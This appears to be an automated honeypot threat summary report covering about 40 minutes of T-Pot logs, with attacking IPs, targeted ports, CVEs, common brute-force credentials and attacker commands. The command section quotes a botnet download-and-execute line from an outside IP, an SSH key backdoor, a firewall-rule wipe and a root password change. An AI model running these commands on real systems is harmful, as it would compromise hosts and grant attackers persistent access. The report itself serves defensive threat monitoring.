
# Honeypot Attack Summary Report

## 1. Report Information

*   **Report ID:** T-Pot-Summary-20250929T060118Z
*   **Generation Date:** 2025-09-29T06:01:18Z
*   **Reporting Period:** 2025-09-29T05:20:01Z to 2025-09-29T06:00:01Z
*   **Data Sources:** T-Pot Honeypot Network Logs (`agg_log_20250929T052001Z.json`, `agg_log_20250929T054001Z.json`, `agg_log_20250929T060001Z.json`)
*   **Prepared For:** Internal Cybersecurity Department
*   **Prepared By:** Summary Agent (Cybersecurity Analyst)

## 2. Executive Summary

This report provides a consolidated summary of malicious activities recorded by the T-Pot honeypot network over a period of approximately 40 minutes. During this timeframe, a total of 10,311 events were captured across various honeypot services.

The threat landscape was dominated by extensive automated scanning and brute-force campaigns, with a significant concentration of attacks originating from a limited number of highly active IP addresses. The most prominent activity involved interactions with the Cowrie (SSH/Telnet), Honeytrap, Suricata (IDS), and Ciscoasa honeypots.

Key findings from this period include:
*   **High Volume of Attacks:** The network registered over 10,000 events, indicating widespread and continuous automated attacks.
*   **Dominant Attack Vectors:** The Cowrie honeypot, simulating SSH and Telnet services, recorded the highest number of interactions (3,720), primarily consisting of brute-force login attempts.
*   **Concentrated Threat Sources:** A small number of IP addresses were responsible for a disproportionately large volume of traffic. Notably, IP address `196.251.88.103` was the most aggressive, logging 1,364 events.
*   **Targeted Services:** Port 445 (SMB) and Port 22 (SSH) were the most targeted services, indicating a continued focus on exploiting file-sharing protocols and remote access services.
*   **Vulnerability Exploitation:** Several attempts to exploit known vulnerabilities were detected, with the most frequent being related to Log4j (CVE-2021-44228).
*   **Malware Delivery:** Analysis of executed commands reveals multiple attempts to download and execute malicious payloads from remote servers, a common tactic for establishing botnet persistence.

This report underscores the persistent and automated nature of modern cyber threats. The data highlights the necessity for robust perimeter defenses, strong credential policies, and timely patching of known vulnerabilities.

## 3. Detailed Analysis

This section provides a granular breakdown of the aggregated data collected from the honeypot logs.

### 3.1. Attacks by Honeypot

The distribution of attacks across the different honeypot services provides insight into the types of protocols and systems being targeted.

| Honeypot Service | Event Count | Percentage | Description |
| :--- | :--- | :--- | :--- |
| Cowrie | 3,720 | 36.08% | SSH/Telnet honeypot, capturing brute-force attempts and shell interaction. |
| Honeytrap | 2,217 | 21.50% | Low-interaction honeypot that observes traffic to various ports. |
| Suricata | 1,580 | 15.32% | Intrusion Detection System (IDS) alerts on suspicious network traffic. |
| Ciscoasa | 1,467 | 14.23% | Simulates a Cisco ASA firewall to capture scanner and exploit attempts. |
| Dionaea | 908 | 8.81% | Low-interaction honeypot designed to capture malware targeting SMB/CIFS. |
| Sentrypeer | 173 | 1.68% | VoIP (SIP) honeypot. |
| Redishoneypot | 55 | 0.53% | Honeypot for Redis key-value stores. |
| Adbhoney | 44 | 0.43% | Honeypot for Android Debug Bridge. |
| Tanner | 39 | 0.38% | Web crawler honeypot. |
| H0neytr4p | 29 | 0.28% | Generic low-interaction honeypot. |
| ConPot | 13 | 0.13% | Industrial Control Systems (ICS) honeypot. |
| Honeyaml | 14 | 0.14% | Honeypot for YAML-based services. |
| Other | 32 | 0.31% | Includes Mailoney, ElasticPot, Dicompot, Miniprint, ssh-rsa. |
| **Total** | **10,311** | **100%** | |

### 3.2. Top 10 Attacking IP Addresses

The following table lists the most active IP addresses observed during the reporting period. These sources are likely part of automated scanning infrastructures or compromised systems.

| IP Address | Event Count |
| :--- | :--- |
| 196.251.88.103 | 1,364 |
| 43.163.91.110 | 962 |
| 147.45.193.115 | 649 |
| 144.130.11.9 | 554 |
| 58.186.122.40 | 305 |
| 185.156.73.167 | 374 |
| 185.156.73.166 | 374 |
| 92.63.197.55 | 365 |
| 92.63.197.59 | 345 |
| 208.109.190.200 | 121 |

### 3.3. Top 10 Targeted Destination Ports

The ports targeted by attackers indicate which services are most frequently scanned for vulnerabilities or weak credentials.

| Port | Protocol | Event Count | Common Service |
| :--- | :--- | :--- | :--- |
| 445 | TCP | 861 | SMB (Server Message Block) |
| 22 | TCP | 721 | SSH (Secure Shell) |
| 5060 | UDP/TCP | 173 | SIP (Session Initiation Protocol) |
| 8333 | TCP | 94 | Bitcoin Protocol |
| 6379 | TCP | 49 | Redis |
| 5985 | TCP | 35 | WinRM (Windows Remote Management) |
| 80 | TCP | 43 | HTTP (Hypertext Transfer Protocol) |
| 2222 | TCP | 14 | SSH (Alternate Port) |
| 443 | TCP | 29 | HTTPS (HTTP Secure) |
| 23 | TCP | 16 | Telnet |

### 3.4. Observed CVEs

The Suricata IDS component detected attempts to exploit the following Common Vulnerabilities and Exposures (CVEs). This list is not exhaustive but reflects signatures triggered by network traffic.

| CVE ID | Count | Description (Summary) |
| :--- | :--- | :--- |
| CVE-2021-44228 | 40 | "Log4Shell" - Remote code execution in Apache Log4j. |
| CVE-2021-3449 | 5 | Denial of service vulnerability in OpenSSL. |
| CVE-2002-0013, CVE-2002-0012 | 5 | Vulnerabilities in SNMPv1 request handling. |
| CVE-2019-11500 | 4 | Information disclosure in Pulse Secure VPN. |
| CVE-2002-0013, CVE-2002-0012, CVE-1999-0517 | 4 | Combination of SNMP and Cisco IOS vulnerabilities. |
| CVE-2019-12263, CVE-2019-12261, CVE-2019-12260, CVE-2019-12255 | 2 | Multiple vulnerabilities in the Cisco QNX Neutrino RTOS. |
| CVE-2005-4050 | 1 | Vulnerability in older versions of Cisco IOS related to BGP. |

### 3.5. Top 10 Credentials Used in Brute-Force Attacks

The Cowrie honeypot captured a large number of login attempts. The table below shows the most frequently used username/password combinations. The prevalence of default and simple credentials remains a significant security risk.

| Username / Password | Attempts |
| :--- | :--- |
| root / (empty) | 30 |
| oracle / oracle | 3 |
| mysql / mysql | 3 |
| worker / worker | 3 |
| user / 111111 | 3 |
| gitlab / gitlab | 5 |
| root / aA123456 | 3 |
| esroot / esroot | 3 |
| nginx / nginx | 3 |
| apache / apache | 3 |

### 3.6. Commands Executed by Attackers

Upon successfully compromising a honeypot (primarily Cowrie), attackers executed several commands. These commands are typically aimed at reconnaissance, disabling security measures, or downloading further malware.

**Most Frequent Command:**
A recurring command sequence was observed multiple times, designed to download and execute a botnet client (`urbotnetisass`) for various architectures (ARM, x86, MIPS). This is indicative of an automated campaign to expand a botnet.
```bash
cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; curl ...; chmod +x ...; ./arm.urbotnetisass android; ...
```
This command was executed 6 times.

**System Reconnaissance Commands:**
Attackers frequently run commands to understand the environment they have compromised.
*   `uname -s -v -n -r -m` (12 times): Displays detailed system information (kernel name, version, architecture, etc.).
*   `uname -a` (3 times): A shorter version of the same command.

**Other Noteworthy Commands:**
*   **SSH Key Installation:** `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys ...` - An attempt to install a persistent SSH key for backdoor access.
*   **Disabling Security:** `rm -rf /tmp/secure.sh; pkill -9 secure.sh; echo > /etc/hosts.deny;` - Attempts to remove competing malware scripts and clear firewall rules.
*   **Changing Password:** `echo "root:VAvHCIvYdzZS" | chpasswd | bash` - An attempt to change the root password to lock out other attackers or the legitimate owner.

## 4. Notes and Limitations

*   **Honeypot Data:** The data in this report is sourced exclusively from a network of honeypots. Honeypots are designed to be attractive targets and may not reflect the exact threats faced by a specific production environment. However, they provide valuable insight into the broader threat landscape and attacker methodologies.
*   **Attribution:** The IP addresses listed are sources of attacks but may include compromised systems, open proxies, or VPN endpoints used to obfuscate the true origin of the attacker. Direct attribution is not feasible based on this data alone.
*   **Encrypted Traffic:** The analysis of traffic is limited to unencrypted protocols or services where decryption is possible (e.g., Telnet). Attacks over encrypted channels (like SSH) are analyzed based on metadata and, if a compromise is successful, post-login activity.
*   **Dropped Events:** A total of 138 events were dropped during the logging process due to high traffic volume or processing limitations. The actual attack count may be slightly higher than reported.

---
**End of Report**
---
